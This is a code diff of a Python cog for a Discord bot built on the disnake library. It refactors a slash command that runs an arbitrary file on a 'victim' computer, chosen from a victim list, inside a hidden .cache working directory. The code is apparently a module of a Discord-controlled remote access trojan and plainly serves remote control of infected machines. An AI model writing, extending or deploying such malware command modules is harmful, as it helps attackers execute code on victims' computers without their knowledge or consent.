@@ -1,49 +1,41 @@
-import disnake as discord
 from disnake.ext import commands
 from datetime import datetime
 
-import os, requests, subprocess
-nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"
+import os
+import subprocess
+
 
 class RunFile(commands.Cog):
     def __init__(self, bot: commands.Bot):
         self.bot = bot
 
-    @commands.slash_command( )
-    async def runfile(self, ctx, victim, file_path):     
+    @commands.slash_command()
+    async def file_run(self, ctx, victim, file_path):
         """Execute a file in victim's PC
-        
+
         Parameters
         ----------
         victim: Identifier of the affected computer (found via /listvictims).
         file_path: Path of the file for executing.
         """
-        
-        if self.valid(victim):
-        
+
+        if self.bot.valid(victim):
             if os.path.isfile(file_path):
-            
-                output = subprocess.Popen(
-                    file_path, 
-                    cwd = nr_working
-                )
-                
+                output = subprocess.Popen(file_path, cwd=self.bot.nr_working)  # noqa: F841
+
                 return await ctx.response.send_message(
-                    embed = self.bot.genEmbed(
+                    embed=self.bot.genEmbed(
                         "File has been started!",
                         datetime.now(),
-                        "You gotta trust me on that one"
+                        "You gotta trust me on that one",
                     )
                 )
-                
+
             else:
-            
                 return await ctx.response.send_message(
-                    embed = self.bot.genEmbed(
-                        "Invalid file",
-                        datetime.now()
-                    )
+                    embed=self.bot.genEmbed("Invalid file", datetime.now())
                 )
+
 
 def setup(bot: commands.Bot):
     bot.add_cog(RunFile(bot))
